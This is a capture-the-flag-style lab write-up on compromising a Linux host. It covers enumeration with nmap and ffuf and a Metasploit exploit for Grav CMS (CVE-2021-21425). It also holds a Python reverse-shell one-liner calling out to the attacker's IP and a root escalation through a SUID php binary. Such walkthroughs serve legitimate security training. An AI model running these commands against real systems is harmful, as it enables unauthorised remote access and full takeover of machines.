

## Lab Details
- Difficulty: Intermediate
- OS: Linux
- Foothold time: 40 minutes 
- Privesc time: 5 minutes 
- Total solve time: 45 minutes

## Summary
- Initial access: Unauthenticated RCE via `Grav CMS` - CVE-2021-21425
- Privilege escalation: Privilege Escalation via SUID on `php`

## Enumeration
- Key findings: found `Grav CMS` is running port 80
##### Steps
- run `nmap`
```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 98:4e:5d:e1:e6:97:29:6f:d9:e0:d4:82:a8:f6:4f:3f (RSA)
|   256 57:23:57:1f:fd:77:06:be:25:66:61:14:6d:ae:5e:98 (ECDSA)
|_  256 c7:9b:aa:d5:a6:33:35:91:34:1e:ef:cf:61:a8:30:1c (ED25519)
80/tcp open  http    Apache httpd 2.4.41
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Index of /
| http-ls: Volume /
| SIZE  TIME              FILENAME
| -     2021-03-17 17:46  grav-admin/
|_
Device type: general purpose
Running: Linux 4.X
OS CPE: cpe:/o:linux:linux_kernel:4
OS details: Linux 4.19 - 5.15
Network Distance: 2 hops
Service Info: Host: 127.0.0.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
## Foothold
- Path: Unauthenticated RCE on `Grav CMS`
- Key commands: `msfconsole`
##### Steps
- run `ffuf` against the endpoint `/grav-admin`
```
$ ffuf -u http://192.168.68.12/grav-admin/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-directories.txt -fc 500 

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://192.168.68.12/grav-admin/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-directories.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response status: 500
________________________________________________

images                  [Status: 301, Size: 326, Words: 20, Lines: 10, Duration: 67ms]
user                    [Status: 301, Size: 324, Words: 20, Lines: 10, Duration: 70ms]
bin                     [Status: 301, Size: 323, Words: 20, Lines: 10, Duration: 82ms]
tmp                     [Status: 301, Size: 323, Words: 20, Lines: 10, Duration: 111ms]
cache                   [Status: 301, Size: 325, Words: 20, Lines: 10, Duration: 183ms]
logs                    [Status: 301, Size: 324, Words: 20, Lines: 10, Duration: 188ms]
backup                  [Status: 301, Size: 326, Words: 20, Lines: 10, Duration: 207ms]
assets                  [Status: 301, Size: 326, Words: 20, Lines: 10, Duration: 5ms]
login                   [Status: 200, Size: 13966, Words: 3067, Lines: 190, Duration: 939ms]
admin                   [Status: 200, Size: 15508, Words: 4330, Lines: 139, Duration: 1152ms]
home                    [Status: 200, Size: 14013, Words: 2089, Lines: 160, Duration: 611ms]
system                  [Status: 301, Size: 326, Words: 20, Lines: 10, Duration: 138ms]
vendor                  [Status: 301, Size: 326, Words: 20, Lines: 10, Duration: 100ms]
forgot_password         [Status: 200, Size: 12382, Words: 2246, Lines: 155, Duration: 1153ms]
user_profile            [Status: 200, Size: 13973, Words: 3067, Lines: 190, Duration: 814ms]
activate_user           [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 463ms]
:: Progress: [62281/62281] :: Job [1/1] :: 81 req/sec :: Duration: [0:14:05] :: Errors: 97 ::
```
- tried SQLi, unable to discover any vectors 
- search online `Grav cms epxploit` and found https://www.exploit-db.com/exploits/49788
- the POC is available in msfconsole
```
msf > search grav

Matching Modules
================

   #  Name                                                  Disclosure Date  Rank       Check  Description
   -  ----                                                  ---------------  ----       -----  -----------
   0  exploit/multi/http/grav_twig_ssti_sandbox_bypass_rce  2025-12-01       excellent  Yes    Grav CMS Twig SSTI Authenticated Sandbox Bypass RCE
   1    \_ target: Unix/Linux Command Shell                 .                .          .      .
   2    \_ target: Windows Command Shell                    .                .          .      .
   3  exploit/linux/http/gravcms_exec                       2021-03-29       normal     Yes    GravCMS Remote Command Execution
<SNIP>
```
- enter the required information and begin the exploit
```
## ensure the target path is /grav_admin
<SNIP>
msf exploit(linux/http/gravcms_exec) > set TARGETURI /grav-admin
<SNIP>
```
- after short while a session gets created
```
msf exploit(linux/http/gravcms_exec) > run
[*] Started reverse TCP handler on 192.168.45.238:22
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target appears to be vulnerable.
[*] Sending request to the admin path to generate cookie and token
[+] Cookie and CSRF token successfully extracted !
[*] Implanting payload via scheduler feature
[+] Scheduler successfully created ! Wait up to 93 seconds
[*] Sending stage (41224 bytes) to 192.168.108.12
[*] Cleaning up the scheduler...
[+] The scheduler config successfully cleaned up!
[*] Meterpreter session 1 opened (192.168.45.238:22 -> 192.168.108.12:32934) at 2026-04-01 12:23:06 -0700

meterpreter > shell
Process 5762 created.
Channel 0 created.
```
- run a reverse shell in the shell session for a lean connection
```
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.45.238",80));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
```
- reverse shell obtained as user `www-data`
```
$ nc -lvnp 80
listening on [any] 80 ...
connect to [192.168.45.238] from (UNKNOWN) [192.168.108.12] 50528
www-data@gravity:~/html/grav-admin$
```
## Lateral Movement 
- Path:
- Key commands:
##### Steps

## Privilege Escalation
- Path: Privlege escalation via SUID
- Key commands: `php`
##### Steps
- load and run `linpeas.sh`
- found `php7.4` has SUID set
```
-rwsr-xr-x 1 root root 4.6M Feb 23  2023 /usr/bin/php7.4 (Unknown SUID binary!)
```
- search on `gtfo.bin` and found privilege escalation using [php](https://gtfobins.org/gtfobins/php/)
- run the payload and obtain a shell as root
```
</php7.4 -r 'posix_setuid(0); system("/bin/sh -i");'
# whoami
root
```
## Lessons Learned
- Attack family: Web, Linux
- Key takeaway:
##### Steps

## Resources
- References: